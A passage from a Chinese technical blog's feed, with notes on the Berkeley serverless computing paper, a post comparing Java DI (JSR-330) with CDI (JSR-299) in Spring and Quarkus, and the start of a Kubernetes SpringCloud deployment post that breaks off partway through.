aria-hidden="true">image-20210819180804653</figcaption></figure><p>从上表我们可以看出，不仅整体的成本下来了，而且原本SysAdmin的工作也全都交由云提供商来完成了，我们只需要敲就完事了。</p><p>下图展示了serverless架构是如何简化了应用部署、让云资源变得更加好用的：</p><figure><imgsrc="/img/Cloud-Programming-Simplified-A-Berkeley-View-on-Serverless-Computing/image-20210819181110837.png"alt="image-20210819181110837" /><figcaption aria-hidden="true">image-20210819181110837</figcaption></figure><p>作者接下来用一个小例子说明了云计算的过程，并指出了serverless的优点：</p><blockquote><p>在云计算下，serverfulcomputing是在一个使用如汇编语言等底层语言来进行实现的，而serverlesscomputing则使用高级编程语言，比如Python。</p><p>举一个例子比如c = a+b，如果是汇编语言的话，首先需要选择多个可以使用的寄存器，然后保存a和b，然后进行数学运算，然后将结果c再另存到寄存器中。这个过程就映射了serverfulcloudprogramming的过程。首先你要准备提供可用的资源或者指出可用的资源，然后将这些资源加载、进行运算、返回或储存这个结果，最后释放资源。</p><p>然而，对于serverlesscomputing，它的目的和应用场景是带给云编程人员上类似述的过度到高级编程语言的一些优势，此外，高级编程语言和serverlesscomputing也有相似之处。就好比自动化的内存管理使得程序员不必自己去管理内存资源一样，serverlesscomputing也使得我们不必去管理服务器资源。</p></blockquote><p>具体来讲，serverless computing和serverful computing有三大区别：</p><ol type="1"><li>将计算和存储解耦(Decoupled)。存储和计算两部分是分开进行伸缩的，并且是分开提供和计费的。即储存服务是由一个单独云服务商提供的，并且计算服务是无状态的。</li><li>在无需管理资源分配的情况下执行代码。写好代码直接扔上去，云平台就会自动分配资源并执行代码。</li><li>在支付(Paying，也就是计费)的时候，不是按照资源分配量来支付而是按照资源使用量来支付(这一点前面也说过了)。平台是按照和运行相关的元素来进行计费的，比如运行的时间，而不是说按照分配好的资源量来计费的，比如给你分的虚拟机数目之类的。通俗点，一个包子一块，你买了3个吃了2个包子就掏2块，不是掏3块。</li></ol><p>下面在上述这三个区别的基础上进行详细讨论</p><h2 id="serverless-computing的上下文讨论定义特征">ServerlessComputing的上下文(讨论定义、特征)</h2><p>让serverlesscomputing实现需要哪些技术呢？作者提及以前也有类似的技术，比如PaaS平台(如Heroku、Firebase等)、CGI技术(Perl，PHP)等等，但是作者认为serverlesscomputing相对于这些传统模型，Serverless Comp带来了更大的创新。</p><p>哪些创新？serverlesscomputing相比之前的这些模型带来了：更好的自动伸缩、较好的隔离机制、平台灵活性和服务生态支持。</p><p>文章举了AWSLambda为例子，说明了Lambda在收缩机制上的进步，并且按照<code>the time thire code was actually executing, not for the resources reserved to execute their program</code>的标准来收取费用。</p><p>ServerlessComputing依赖于强大的性能和安全的隔离机制来让多用户同享硬件，目前的标准是使用类似VM虚拟机的隔离机制，当然VM虚拟机的创建肯跟会花费一定时间，所以serverless的提供商们在尽力用技术来加速开发环境的创建。文章举的还是Lambda的例子，Lambda中有两个缓冲池，一个叫做<code>warm pool</code>，由一些VM实例组成，可以理解为预热池，直接按需分配给用户而无需再去创建；还有一些VM实例组成了<code>active pool</code>，这些实例正在运行且被一直维护来供未来使用。<strong>所以，使用资源生命周期管理以及多用户打包来实现高利用率，对serverlesscomputing来说是重要的技术点</strong>，文章指出近期一些厂商在通过容器技术、<em>unikernel</em>、libraryOSes，或者<em>languageVMs</em>来降低多用户隔离的开销，比如Google的gVisor，已被<em>AppEnging</em>、<em>Cloud Functions</em>、Cloud MLEngine采用；Amazon的<em>Firecracker</em>虚拟机已被<em>AWSLambda</em>和<em>Fargate</em>采用；<em>CloudFlareWorkers</em>的serverless平台则采用了Web浏览器沙盒技术，在一些使用JavaScript实现的云功能之间进行用户隔离。</p><p>serverless computing还有一些其他的优势：</p><ul><li>允许用户使用自己的库(libraries)，所以较PaaS平台支持更广应用面的应用程序。而<strong>PaaS服务则和具体的应用捆绑在一起</strong>。</li><li>FaaS使得serverless流行的原因还有一点：背后的BaaS提供了其他的基础性功能，而这些基础性功能从公有云出现的时候(比如AWSS3)就存在了。所以BaaS的存在也是一个优势。</li></ul><p><strong>这里作者也澄清了一个概念，FaaS和Serverlesscomputing不是一个东西，前文如果你有和我一样的疑惑，这里就解开了</strong></p><blockquote><p>Cloud functions(i.e., FaaS) represent serverless computing in a moregenerel form.</p></blockquote><p>即FaaS它知识ServerlessComputing的一个更为具体的形式，即规范和实现这种关系。下表对比了一些serverlesscomputing服务在编程接口和消费模型上的区别，我们可以看到不同应用他的接口以及模型都是消费方式都是不一样的，<strong>个人认为这旨在说明了ServerlessComputing服务的应用领域的多样性。</strong></p><figure><imgsrc="/img/Cloud-Programming-Simplified-A-Berkeley-View-on-Serverless-Computing/image-20210819201741247.png"alt="image-20210819201741247" /><figcaption aria-hidden="true">image-20210819201741247</figcaption></figure><p><strong>要注意一点就是，这些应用的存储费用是要单独来收取的，比如GoogleCloud Storage、AWS S3等。</strong></p><p>接下来作者围绕一些新兴技术结合着进行了讨论，包括Kubernetes技术、边缘计算技术。</p><p>首先是关于Kubernetes的，要讨论一个问题：</p><blockquote><blockquote><p>how it relates to Kubernetes？</p></blockquote><p>这和Kubernetes有啥关系吗？</p></blockquote><p>首先是什么是Kubernets的定义？</p><blockquote><blockquote><p>a "container orchestration" technology for deployingmicroservices</p></blockquote><p>一个用来部署微服务的容器编排技术</p></blockquote><p>所以结论是，不同于<em>ServerlessComputing</em>，<em>Kubernetes</em>它是一个可以简化<em>serverfulComputing</em>的技术。下面是他们的相似点与不同点：</p><ul><li><em>Kubernetes</em>也可以提供短期(short-lived)的运行环境，但在硬件资源、运行时间和网络通信这些方面上限制小得多。</li><li><em>Kubernetes</em>可以直接将你自己本地开发的应用程序直接部署到公有云上，并且几乎没啥修改。而ServerlessComputing则引入了一种范式转变(paradigmshift)，将操作责任完全交给了提供者，并让细颗粒度的多用户多路复用成为可能。GoogleKubernetes Engine(GKE)以及AWS Elastic KubernetesService(EKS)都提供了一个中庸的选择：既减轻了Kuberenetes的运行管理，也给予了开发者能够配置任意容器的灵活性</li><li><em>Kubernetes</em>和<em>ServerlessComputing</em>的收费方式也不一样，前者是按照拥有的资源来收费，而后者是按照每个功能的运行时间来收费</li></ul><p>作者接下来也阐述了一个<strong>预测</strong>，Kubernetes不仅可以本地运行应用，它也同样使用于混合型的应用程序，比如一部分运行在本地，另一部分运行在云上。作者认为这种混合型的应用对于<strong>逐步迁移到云</strong>这一过程是有意义的。但是长远来看，作者认为云计算规模的逐渐扩大、更快速的网络、不断增加的云服务、通过ServerlessComputing技术而逐渐简化的云资源管理，这样的混合型应用的存在感会慢慢减小。</p><p>紧接着作者讨论了边缘计算方面。</p><blockquote><blockquote><p>Edge computing is the partner of cloud computing in the PostPCEra.</p></blockquote><p>边缘计算是后PC时代、云计算的合作伙伴</p></blockquote><p>这里作者主要讨论ServerlessComputing将如何改变数据中心内的变成，这对边缘计算也有有趣的潜在影响。一些内容交付网络(CDN)运营商提供了在靠近用户在基础设施中执行一个Serverless函数的功能，甚至<em>AWSIoT Greengrass</em>还可以吧这些函数嵌入到边缘设备中。</p><h2 id="serverless-computing的优势">Serverless Computing的优势</h2><blockquote><p>本章主要说明了一些ServerlessComputing的优势，带来的好处，并陈述了一些表明ServerlessComputing在不断增长的数据报告，这块我就不写具体数据了。</p></blockquote><ul><li><p>对于云提供商来说ServerlessCOmputing技术可以促进业务增长，因为这使得云资源更容易吸引新的用户以及让旧用户发现更多可探索的功能。</p></li><li><p>由于ServerlessComputing运行时间短、内存占用小、无状态的特性，云提供商可以用一些未使用的资源来运行这些任务，比如一些没那么流行的、普通的计算机资源，这些资源可能对于传统Serverful的用户来说没啥用，但是可以投入到Serverless使用中去。</p></li><li><p>对于客户来说，Serverless允许使用高级编程语言，提高了客户的生产效率，并且还可以节省成本。</p></li><li><p>Serverless也让云部署的级别从x86机器码提升到了高级编程语言，带来了架构的创新。比如，如果ARM或者RISC-V能带来比x86更高的效率的话，Serverless平台可以轻松地切换指令集。</p></li><li><p>对新手非常友好。即使是菜鸡也能在不了解云基础设施的情况下轻松地部署函数功能，大神们也可以节省开发时间来专注于业务本身。</p></li><li><p>研究人员被ServerlessComputing所吸引，因为它有望成为云计算的未来，有更多的机会来提升当前的性能并客服当前的局限性。</p></li></ul><h1 id="第三章-serverless-computing平台当前的局限性">第三章 ServerlessComputing平台当前的局限性</h1><blockquote><p>本节作者举了五个研究项目的例子来讨论阻碍了ServerlessComputing技术的一些难题。包括：</p><ul><li>ExCamera: Video encoding in real-time</li><li>MapReduce</li><li>Numpywren: Linear algebra</li><li>Cirrus: Machine learning training</li><li>Serverless SQLite: Databases</li></ul></blockquote><p>下面是这五个项目的总结，包括功能性描述、挑战、工作环境、表现。接下来会对表里出现的问题进行讨论。</p><p><imgsrc="/img/Cloud-Programming-Simplified-A-Berkeley-View-on-Serverless-Computing/image-123.png" /></p><h2 id="细颗粒度操作的储存不够">细颗粒度操作的储存不够</h2><blockquote><p>serverless平台天生就是无状态的，所以这导致很难去支持一些需求是细颗粒度状态共享的应用。<strong>而这最大的原因，就是因为现存的、云服务商提供的存储服务的局限性。</strong></p></blockquote><p>哪些局限性？下表进行了说明：</p><p><imgsrc="/img/Cloud-Programming-Simplified-A-Berkeley-View-on-Serverless-Computing/image-123231.jpg" /></p><p>上表中绿色就是好，橙色就是罢了，红色就是不大行。最后一列是我们想要的--<code>Ideal</code></p><p>包括了Block Storage类型、对象型数据库(AWS S3、Azure BlobStorage、Google Cloud Storage)、文件系统、键值型数据库(AWSDynamoDB、Google Cloud Datastore、Azure CosmosDB)。但是上述这些应用都有各自的优缺点。</p><p><strong>学术研究价值：由于不同的应用程序需要不同的持久性和可用性保证，所以作者认为这需要我们去开发一些临时的和持久的Serverless存储方案</strong>，第四章会详细讨论。</p><h2 id="缺乏精细的协同coordination">缺乏精细的协同(coordination)</h2><blockquote><p>为了扩展Serverless Computing的能力来支持状态化的应用(statefulapplications)，serverless框架需要提供一种可以用来<strong>协同</strong>的方式。好比taskA用了taskB的输出，那么A必须要有一种方式能知道B是否产生了输出，即使这俩不在一个节点上。许多旨在确保数据一致性(<code>data consistency</code>)的协议也需要类似的<strong>协同</strong>。</p></blockquote><p>这里作者想说的协同我个人理解就是通信的方式，目前没有一个云存储服务提供了通知功能(<code>notification capabilities</code>)。虽然云提供商业提供了<strong>独立的通知服务</strong>，比如SNS、SQS，但是它们都带来了较大的延迟，有时候甚至几百毫秒。而且对于细颗粒度的协同来说花费太大。</p><p>虽然也有一些论文提出了新的系统比如Pocket -- Pocket: Elastic ephemeralstorage for serverless analytics. <em>In 13th USENIX Systemposium onOperating Systems Design and Implementation</em>(OSDI 18), pages472-444, 2018，但是该方案也尚未被云提供商锁才去。</p><p>所以，对于开发者来说，他们的程序就么得选择了，就只能要么用虚拟机来提供比如ElastiCache或者SAND这样的通知服务，或者他们自己实现一套通信机制。</p><p><strong>学术研究价值：新的ServerlessComputing还值得被挖掘和探索，比如对函数实例进行命名，以实现直接寻址访问其内部状态(比如Actorsas a Server, 来自：Johnn Schleier-Smith. Serverless foundations forelastic database systems. CIDR, 2019)。</strong></p><h2 id="标准通信模式下性能较差">标准通信模式下性能较差</h2><p><code>broadcast-广播</code>，<code>aggregation-聚合</code>，<code>shuffle-重新分发数据</code>这些都是常见的分布式系统的通信原语，一把都是由应用来执行，比如说在机器学习训练过程中或者大数据分析过程中。下标展示了基于VM虚拟机或者基于函数的方案使用这些原语所构成的通信方式：</p><p><imgsrc="/img/Cloud-Programming-Simplified-A-Berkeley-View-on-Serverless-Computing/image-f43792384.jpg" /></p><p>从图中可以看到a中的VM通信方式所需的远程消息数目明显少于b，这是因为VM实例支持在发送数据之前或者之后，可以夸人物在本地进行共享、聚合、组合。</p><p>对于VM方案，所有在同一个实例上运行的任务都可以获取被广播的数据的副本，或者在给其他实例发送数据前先进行本地的聚合。所以对于VM方案，广播和聚合的通信复杂度是<em>O(N)</em>，N代表系统中VM的实例数目。</p><p><strong>学术价值：然而，对于基于函数的方案，这个复杂度是<em>O(N xK)</em>，其中K代表每一个VM的函数的数目</strong>。对于Shuffle操作来说这个差别更大了，假如说同样数目的发送这和接受者产生了N^2个消息数目，对于b方案来说，就需要发送<strong><em>(Nx K)^2</em></strong>个数目的消息，K通常上范围是[10,100]。这都是理想的状态，由于应用程序不能控制云功能的位置，有可能一个ServerlessComputing应用就得发送比这个多2到个数量级的数据。</p><h2 id="不可预测的表现">不可预测的表现</h2><p>尽管云函数比传统的基于VM虚拟机的实例启动延迟要小的多，但是对于一些应用，云函数的方式可能会导致他的启动延迟变大。有三个影响这个冷启动延迟的因素：</p><ul><li>启动云函数的时间</li><li>初始化这个函数所需要软件环境的时间，比如加载Python库</li><li>具体应用中用户代码的初始化时间</li></ul><p>虽然说可能一个云函数启动花费时间小于一秒，但是如果云函数的数目多了，这个时间就会变成几十秒。<strong>这是一个值得研究的学术问题。</strong></p><p><strong>此外另一个值得研究的问题就是</strong>，由于云提供商提供选择的底层服务器种类多样，所以导致很难去预测硬件资源的性能，比如不同世代的CPU，<strong>这种不确定性暴露了云提供商希望最大限度利用他们的资源的愿望和 可预测性之间的取舍问题。</strong></p><h1 id="第四章-serverless-computing的未来">第四章 ServerlessComputing的未来</h1><blockquote><p>这一章作者主要说研究人员已经开始着手解决上一章节提到的问题了，包括伯克利的人也在寻找以数据为中心的分布式系统、机器学习和编程模型的挑战以及ServerlessComputing的机遇。下面小结将以一个广泛的视角来讨论一些能够良好结合ServerlessComputing的应用和硬件的例子，<strong>并指明学术界的挑战，主要包括五个方面：抽象、系统、网络、安全性、架构</strong></p></blockquote><h2 id="抽象挑战">抽象挑战</h2><h3 id="资源需求">资源需求</h3><h3 id="数据依赖">数据依赖</h3><h2 id="系统挑战">系统挑战</h2><h3id="高性能的经济实惠透明工作的存储服务">高性能的、经济实惠、透明工作的存储服务</h3><h4 id="ephemeral-storage临时性存储">Ephemeral Storage(临时性存储)</h4><h4 id="durable-storage永久性存储">Durable Storage(永久性存储)</h4><h3 id="协同信号机制signaling服务">协同/信号机制(signaling)服务</h3><h3 id="最小化启动时间">最小化启动时间</h3><h2 id="网络挑战">网络挑战</h2><h2 id="安全挑战">安全挑战</h2><h3 id="调度随机化和物理隔离">调度随机化和物理隔离</h3><h3 id="细颗粒度的安全上下文管理">细颗粒度的安全上下文管理</h3><h3 id="oblivious遗忘的-serverless-computing">Oblivious(遗忘的)Serverless Computing</h3><h2 id="计算机架构挑战">计算机架构挑战</h2><h3 id="硬件异构性定价和管理便利性">硬件异构性、定价和管理便利性</h3><h2 id="参考学习">参考学习</h2><p>Jonas E , Schleier-Smith J , Sreekanti V , et al. Cloud ProgrammingSimplified: A Berkeley View on Serverless Computing[J]. 2019.</p><p><ahref="https://blog.csdn.net/wufeifan_learner/article/details/109901263">(72条消息)论文阅读笔记（五）：Cloud Programming Simplified: A Berkeley View onServerless Computing_wufeifan_learner的博客-CSDN博客</a></p><p><ahref="https://blog.csdn.net/qq_21125183/article/details/94442852">(72条消息)Cloud Programming Simplifie : A Berkeley View on ServerlessComputing_Master-TJ的个人博客-CSDN博客</a></p><p><a href="https://developer.aliyun.com/article/713966">阿里毕玄：《ABerkeley View on Serverless Computing》读后感-阿里云开发者社区(aliyun.com)</a></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom: 50%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这篇论文深入探讨了Serverless
Computing这个较新的云计算概念，并讨论了它的来源、想要解决的问题等等。最近也是接触了一些新的云技术的思想和技术，尤其是自接触了Kubernetes和Quarkus，触发了我对这个领域的好奇心。云计算领域之前也有写过文章&lt;a
href=&quot;https://float311.gitee.io/posts/662e1cfe.html&quot;&gt;微服务入门-5W和微服务思想
· float&#39;s
blog&lt;/a&gt;，但是当时只是简单的看了一下供微服务应用底层使用的一些平台，比如IaaS、PaaS，FaaS等等，也只简单了解了Serverless的概念。故跟着学习一下。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="论文阅读" scheme="https://lzwgiter.github.io/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    
    
    <category term="论文阅读" scheme="https://lzwgiter.github.io/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    
    <category term="云技术" scheme="https://lzwgiter.github.io/tags/%E4%BA%91%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>闲聊一下Java中的DI和CDI</title>
    <link href="https://lzwgiter.github.io/posts/99665dc1.html"/>
    <id>https://lzwgiter.github.io/posts/99665dc1.html</id>
    <published>2021-08-18T08:11:16.000Z</published>
    <updated>2021-08-25T11:24:22.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>emm，更具体地来说其实是闲聊JSR-299与JSR-330，以及进一步澄清Spring的DI和Quarkus的CDI的概念。能疑惑这个问题只能说明我对Java的历史不够了解啊，只是很肤浅的去使用而没有思考其来源。</p><p>思考这个问题是因为我接触了Quarkus这个Java框架，大家一说到区块链一说到容器化可能都会去想go，而不是资源占有大且重量级的Java，这个框架就是用来解决Spring系列在这方面繁重的问题的，具体我会在Quarkus系列中详细叙述该框架的优点。</p><p>今天这篇文章主要内容包括这些：</p><ul><li>澄清一下DI(<em>Dependency Injection</em>)和CDI(<em>Context andDependencyInjection</em>)的关系与区别，顺带记录一下我自己思考的过程；</li><li>澄清一下记Spring的ioc机制和这二者的关系(其实这俩没关系。。)</li><li>简言一下Quarkus的特点</li></ul></blockquote><span id="more"></span><h1 id="我在疑惑什么">我在疑惑什么？</h1><p>我为什么闲了发现这个问题呢？大家平常都用IDEA写代码，IDEA为我们提供了大量的、巨好用的插件，你好比说你的项目是Spring-Boot的，你可能会看到这样的组件：</p><figure><img src="/img/闲聊一下Java中的DI和CDI/image-20210821170658738.png"alt="image-20210821170658738" /><figcaption aria-hidden="true">image-20210821170658738</figcaption></figure><p>组件中我们可以清晰的看到我们定义的<code>bean</code>。</p><p>而如果在Quarkus项目中，他是这个样子的：</p><figure><img src="/img/闲聊一下Java中的DI和CDI/image-20210821171622638.png"alt="image-20210821171622638" /><figcaption aria-hidden="true">image-20210821171622638</figcaption></figure><p>然后我就好奇了，CDI？CDI是啥意思？我初步的猜测是以为：<del>Spring和Quarkus都对ioc这个理论进行了实现，在Quarkus中叫CDI。</del></p><p>然后我一查，我发现憨憨就是我了。</p><h2 id="cdi和di的关系和区别">CDI和DI的关系和区别?</h2><p>CDI的全称叫<em>Context and DependencyInjection</em>，即上下文与依赖注入，DI的全程叫<em>DependencyInjection</em>。</p><p>ok，多了个Context，有啥大区别啊？然后我就可劲的翻百度，国内貌似没有人像我一样问这个憨憨的问题，ok翻谷歌，哎就翻出来了。</p><p>首先要知道什么是JSR，JSR全称是<em>Java SpecificationRequest</em>，是不是有点RFC那味了？差不多其实，JSR大家都可以提交，都可以提出一个自己构思的没有出现过的Java新特性，然后交由JCP(<em>JavaCommunityProcess</em>)来进行审核，最终如果通过了审核，那么就会被加入新的Java版本中作为新特性，JCP的职责如下：</p><blockquote><p>The Java Community Process (JCP) Program is the process by which theinternational Java community standardizes and ratifies thespecifications for Java technologies.</p></blockquote><p>而我们的CDI和DI，恰恰就是在Java EE6中的新特性，二者分别定义域JSR299以及JSR 330：</p><figure><img src="/img/闲聊一下Java中的DI和CDI/image-20210821172543081.png"alt="image-20210821172543081" /><figcaption aria-hidden="true">image-20210821172543081</figcaption></figure><figure><img src="/img/闲聊一下Java中的DI和CDI/image-20210821172554156.png"alt="image-20210821172554156" /><figcaption aria-hidden="true">image-20210821172554156</figcaption></figure><p>按照时间线，最早提出的其实是DI，该提案由Bob Lee和RodJohnson在2015年1月9号提出，实现了ioc这一核心概念，如果你想要了解ioc，可以参考我之前的文章：<ahref="https://float311.gitee.io/JavaEE基础-Spring学习%20-%20IOC机制/#IOC">JavaEE基础-Spring学习- IOC机制 · float's blog (gitee.io)</a>。</p><p><strong>而这些新的特性，都被包含在了<code>javax.inject</code>这个包中</strong>:</p><p><img src="/img/闲聊一下Java中的DI和CDI/image-20210821173003704.png" alt="image-20210821173003704" style="zoom:80%;" /></p><p>我们可以看一下这个包都包含了什么：</p><figure><img src="/img/闲聊一下Java中的DI和CDI/image-20210821173022697.png"alt="image-20210821173022697" /><figcaption aria-hidden="true">image-20210821173022697</figcaption></figure><p>嗷，一共有六个注解，我把他们的定义列一个表看看，英文是源代码注释，中文是我自己补充的</p><table><colgroup><col style="width: 14%" /><col style="width: 85%" /></colgroup><thead><tr class="header"><th>注解名称</th><th>定义</th></tr></thead><tbody><tr class="odd"><td><span class="citation" data-cites="Inject">@Inject</span></td><td>Identifies injectable constructors, methods, and fields. May applyto static as well as instance members. An injectable member may have anyaccess modifier (private, package-private, protected, public).</td></tr><tr class="even"><td><span class="citation" data-cites="Named">@Named</span></td><td>给被@Inject指定的bean设定名称，比如@Inject <span class="citation"data-cites="Named">@Named</span>('driver') Seat driverSet;</td></tr><tr class="odd"><td><span class="citation" data-cites="Provider">@Provider</span></td><td>Provides instances of T. Typically implemented by an injector. Forany type T that can be injected, you can also inject Provider<T>.类似一个工厂，使用这个注解而不是@Inject可以带来一些特性(比如懒加载、多例、对实例的来源范围进行抽象、打破循环依赖)</td></tr><tr class="even"><td><span class="citation" data-cites="Qualifier">@Qualifier</span></td><td>Identifies qualifier annotations. Anyone can define a newqualifier.</td></tr><tr class="odd"><td><span class="citation" data-cites="Scope">@Scope</span></td><td>Identifies scope annotations. A scope annotation applies to a classcontaining an injectable constructor and governs how the injector reusesinstances of the type. By default, if no scope annotation is present,the injector creates an instance (by injecting the type's constructor),uses the instance for one injection, and then forgets it. If a scopeannotation is present, the injector may retain the instance for possiblereuse in a later injection.你可以用这玩意儿定义自己的<strong>范围注解</strong>，比如典型的注解@Singleton就组合了<spanclass="citation" data-cites="Scope">@Scope</span></td></tr><tr class="even"><td><span class="citation" data-cites="Singleton">@Singleton</span></td><td>Identifies a type that the injector only instantiates once. Notinherited.</td></tr></tbody></table><p>当我看到这六个注解的时候，我的第一反应：<strong>这咋和Spring的@Autowired、<spanclass="citation"data-cites="Bean之类的那么像呢">@Bean之类的那么像呢</span>？</strong>我们把这个问题放到下一章讨论。</p><p>ok，DI我懂了，由JSR 330提出，就是上面那六个注解，那CDI是啥？不都有JSR330了么？要JSR 299干啥？</p><p>其实我这么说你想想，上面这几个注解是不是可以帮你很好的注入JavaBean吧？那问题来了，这些JavaBean所存在的上下文(Context)你怎么获取呢？</p><p>我们把视野放到今天，具体点，Spring中的<code>ApplicationContext</code>(org.springframework.context.ApplicationContext)，可以用来从xml格式的bean配置文档中获取bean，你JSR330可以吗？Spring中支持AOP切面编程，你JSR 330可以吗？所以你可以看到，JSR330虽然开辟了一个新世界，但是也仅仅是开辟，属于很简单的ioc。</p><p>所以Gavin King提出了JSR 299。<strong>它对JSR 330进行了加强，以JSR330作为基础，增加了大量的特性，显著地增加了对模块化(modularzation)、切面编程(crosscutting aspects)、自定义范围(custom scopes)、类型安全的注入(type safeinjection)的支持。</strong></p><p>有人对JSR 299和JSR 330的区别是这么解释的：</p><blockquote><p>The relation between JSR-299 and JSR-330 is comparable to therelation between JPA and JDBC. JPA uses internally JDBC, but you canstill use JDBC without JPA. In Java EE 6 you can just use JSR-330 forbasic stuff, and enhance it on demand with JSR-299. There is almost nooverlap in the practice. You can even mix JSR-299 / JSR-330 with EJB 3.1- to streamline your application.</p></blockquote><p>JSR 330更像一个低层次的ioc描述，就如同JDBC一样，而JSR299就如同JPA，他凌驾于JDBC、底层使用JDBC并增加了大量的特性。</p><p><strong>所以结论就是，JSR 330和JSR299是上下级的关系，但二者的目的是一致的，这并非是重复造轮子，而是不断的对ioc概念的实现进行摸索的过程。</strong></p><p>下面我们再聊聊Spring和Quarkus。</p><h2id="spring和quarkus在ioc上的区别">Spring和Quarkus在ioc上的区别？</h2><p>实际上，我一句话就能说清了，Spring的那一套DI都是自己，并不是在JSR330或者JSR299上重新写的，而Quarkus则是使用的Java官方的JSR实现，这就是二者的区别了。也就是你使用Spring这一套那肯定避免不了需要依赖，而你如果使用JSR那一套就可以直接使用了。</p><h1 id="后话">后话</h1><p>Quarkus这个框架蛮有意思的，叫<code>Kubernetes native</code>的框架，相较于Spring由于换了底层的虚拟机，<strong>节省了内存开销、加快了启动时间、减小了包的体积等等</strong>，并且支持打包Kubernetes、打包Docker，是不是有点Go语言那个味了？对的，这个框架就是这个目的了：</p><blockquote><p>Quarkus rethinks Java, using a closed-world approach to building andrunning it. It has turned Java into a runtime that's comparable to Go.--- 《A guide to Java serverless functions - Why choose Java forserverless application development and how to getstarted》，OPENSOURCE.COM</p></blockquote><p>为了让Java在也能改头换面，<strong>在Serverless领域能占有一席之地。</strong>我的另一篇文章<ahref="https://float311.gitee.io/Cloud-Programming-Simplified-A-Berkeley-View-on-Serverless-Computing/">CloudProgramming Simplified:A Berkeley View on Serverless Computing · float'sblog(gitee.io)</a>里跟进学习了UCB关于Serverless结构的文章，<strong>里面就有提到要减小内存开销，提高启动速度，这样也能减小成本开销。</strong>那么这个框架就是想区别于Spring(虽然Spring有个SpringFunction)，达到这样的目的，后续我也会跟进学习这个框架的使用，感兴趣的同学可以一起学学。</p><h1 id="参考学习">参考学习</h1><p><a href="https://jcp.org/en/jsr/detail?id=330">The Java CommunityProcess(SM) Program - JSRs: Java Specification Requests - detail JSR#330 (jcp.org)</a></p><p><a href="https://jcp.org/en/jsr/detail?id=299">The Java CommunityProcess(SM) Program - JSRs: Java Specification Requests - detail JSR#299 (jcp.org)</a></p><p><a href="https://dzone.com/articles/what-relation-betwe-there">WhatIs The Relation Between JSR-299 and JSR-330 In Java EE 6? Do We Need TwoDI APIs? - DZone Java</a></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom: 50%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;emm，更具体地来说其实是闲聊JSR-299与JSR-330，以及进一步澄清Spring的DI和Quarkus的CDI的概念。能疑惑这个问题只能说明我对Java的历史不够了解啊，只是很肤浅的去使用而没有思考其来源。&lt;/p&gt;
&lt;p&gt;思考这个问题是因为我接触了Quarkus这个Java框架，大家一说到区块链一说到容器化可能都会去想go，而不是资源占有大且重量级的Java，这个框架就是用来解决Spring系列在这方面繁重的问题的，具体我会在Quarkus系列中详细叙述该框架的优点。&lt;/p&gt;
&lt;p&gt;今天这篇文章主要内容包括这些：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;澄清一下DI(&lt;em&gt;Dependency Injection&lt;/em&gt;)和CDI(&lt;em&gt;Context and
Dependency
Injection&lt;/em&gt;)的关系与区别，顺带记录一下我自己思考的过程；&lt;/li&gt;
&lt;li&gt;澄清一下记Spring的ioc机制和这二者的关系(其实这俩没关系。。)&lt;/li&gt;
&lt;li&gt;简言一下Quarkus的特点&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="杂谈" scheme="https://lzwgiter.github.io/categories/%E6%9D%82%E8%B0%88/"/>
    
    
    <category term="Java" scheme="https://lzwgiter.github.io/tags/Java/"/>
    
    <category term="Quarkus" scheme="https://lzwgiter.github.io/tags/Quarkus/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes-集群环境搭建使用及问题记录（三）</title>
    <link href="https://lzwgiter.github.io/posts/ed901271.html"/>
    <id>https://lzwgiter.github.io/posts/ed901271.html</id>
    <published>2021-08-12T08:07:19.000Z</published>
    <updated>2021-10-29T07:55:44.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>上一篇主要记录了什么是kubernetes的资源编排yaml文件、如何编写yaml文件，并给了一个Hello-world的demo，当然那个只是展示作用，没啥价值。这篇以一个SpringCloud的项目作为例子，记录一下部署到Kubernetes中的全过程。</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（一）/components-of-kubernetes.png"alt="image-20210810183438958" /><figcaption aria-hidden="true">image-20210810183438958</figcaption></figure></blockquote><span id="more"></span><h1id="实战-编写springcloud项目的资源编排文档">实战-编写SpringCloud项目的资源编排文档</h1><h2 id="一个springcloud的demo">一个SpringCloud的Demo</h2><p>为了学习编写这个资源编排文件，我单独写了一个非常简单的SpringCloud程序，由四部分构成：两个Eureka注册中心、一个叫做<code>MailService</code>的邮箱服务、一个可以用来访问<code>MailService</code>的客户端--称为<code>MailClient</code>，下面我一一展示这四个部件的代码，说明功能，然后把他们搬到Kubernetes里面去。</p><p>项目结构如下所示：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 